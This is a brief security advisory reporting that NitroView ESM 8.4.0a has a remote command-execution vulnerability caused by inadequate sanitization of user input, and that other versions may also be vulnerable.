NitroView ESM is prone to a remote command-execution vulnerability because it fails to adequately sanitize user-supplied input.

Successful attacks may allow an attacker to execute arbitrary commands on the appliance in the context of the webserver process.

NitroView ESM 8.4.0a is affected; other versions may also be vulnerable.
